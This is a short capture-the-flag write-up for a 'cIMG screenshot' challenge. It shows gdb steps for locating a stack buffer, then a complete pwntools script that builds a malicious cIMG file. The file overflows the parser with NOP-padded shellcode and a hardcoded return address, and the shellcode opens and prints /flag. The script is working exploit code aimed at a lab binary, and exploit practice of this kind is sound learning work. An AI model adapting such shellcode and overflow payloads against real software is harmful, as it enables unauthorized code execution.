# CIMG Screenshots

#### First need to find the buffer address. 0x401ecf is the target. Run ```b *0x401ecf``` then ```r s.cimg``` and then after it hits the break ```x/gx $rsp + 0x10```. The address needed is the high address, or the 0xffff one.
```asm
0x0000000000401ecf <+54>:    lea    0x10(%rsp),%rdi
```

```gdb
Breakpoint 3, 0x0000000000401ecf in handle_1337 ()
(gdb) x/gx $rsp + 0x10
0x7fffffffd4e0: 0x0000000000000000
```
--------------------------------------------------

#### Need to use the shellcode to open /flag and then setup the handles. Start with the header, handle 5 to open the file, handle 4 to render the fake sprite and then handle 1337 to screenshot it. Need a NOP sled and padding.
```python
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

def cimg():
    addr = 0x7fffffffd4e0
    pad = 168
    file = b'/tmp/sc_cimg.bin'

    asmbl = """
    xor rsi, rsi
    push rsi
    mov rdi, 0x67616c662f2f2f2f
    push rdi
    mov rdi, rsp
    push 2
    pop rax
    xor rdx, rdx
    syscall

    mov rsi, rax
    push 1
    pop rdi
    xor r10, r10
    mov r10w, 1000
    push 40
    pop rax
    xor rdx, rdx
    syscall

    push 60
    pop rax
    syscall
    """
    sc = asm(asmbl)
    data = sc.ljust(pad, b'\x90') + p64(addr)
    data_len = len(data)

    with open(file, 'wb') as f:
        f.write(data)

    cimg = b'cIMG' + p16(4) + p8(data_len) + p8(1) + p32(3)
    cimg += p16(5) + p8(0) + p8(data_len) + p8(1) + file.ljust(255, b'\x00')
    cimg += p16(4) + p8(0) + p8(255)*3 + p8(0)*2 + p8(1)*2 + p8(0xcc)
    cimg += p16(1337) + p8(0)*3 + p8(data_len) + p8(1)

    with open('s.cimg', 'wb') as f:
        f.write(cimg)

if __name__ == '__main__':
    cimg()

    io = process(['/challenge/integration-cimg-screenshot-sc', 's.cimg'])
    out = io.recvall(timeout=1).decode()
    print(out)
```
